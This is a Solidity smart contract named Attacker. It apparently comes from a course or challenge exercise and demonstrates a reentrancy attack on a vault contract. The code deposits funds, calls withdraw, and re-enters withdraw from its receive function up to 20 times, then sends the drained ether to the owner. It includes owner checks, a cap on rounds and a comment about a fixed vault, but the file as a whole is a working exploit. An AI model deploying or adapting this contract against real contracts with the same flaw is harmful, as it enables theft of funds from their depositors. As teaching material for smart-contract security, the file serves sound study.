// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IChallengeVault {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Bounded demonstration against the course vault supplied at deployment.
contract Attacker {
    IChallengeVault public immutable target;
    address payable public immutable owner;
    uint256 public chunk;
    uint256 public receiveCount;
    uint256 public constant MAX_RECEIVES = 20;
    bool private attacking;

    event Received(uint256 round, uint256 amount, uint256 vaultRemaining);

    constructor(address vault) {
        require(vault.code.length > 0, "Attacker: target is not a contract");
        target = IChallengeVault(vault);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.sender == owner, "Attacker: only owner");
        require(!attacking, "Attacker: active");
        require(msg.value > 0, "Attacker: zero value");
        attacking = true;
        chunk = msg.value;
        receiveCount = 0;
        target.deposit{value: msg.value}();
        target.withdraw();
        attacking = false;
    }

    receive() external payable {
        require(msg.sender == address(target) && attacking, "Attacker: unexpected sender");
        receiveCount++;
        emit Received(receiveCount, msg.value, address(target).balance);
        if (receiveCount < MAX_RECEIVES && address(target).balance >= chunk) {
            // Propagate failure: FixedVault makes the entire attack revert.
            target.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "Attacker: only owner");
        require(!attacking, "Attacker: active");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Attacker: collect failed");
    }
}
